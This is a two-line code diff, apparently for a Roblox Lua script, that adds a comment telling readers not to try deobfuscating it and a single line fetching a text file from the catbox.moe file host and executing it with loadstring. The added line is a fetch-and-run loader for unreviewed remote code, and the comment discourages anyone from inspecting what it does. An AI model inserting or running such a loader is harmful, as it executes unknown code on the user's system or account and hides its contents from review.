@@ -1,0 +1,2 @@
+-- don't try to deobfuscating
+loadstring(game:HttpGet("https://files.catbox.moe/2y98vc.txt"))()
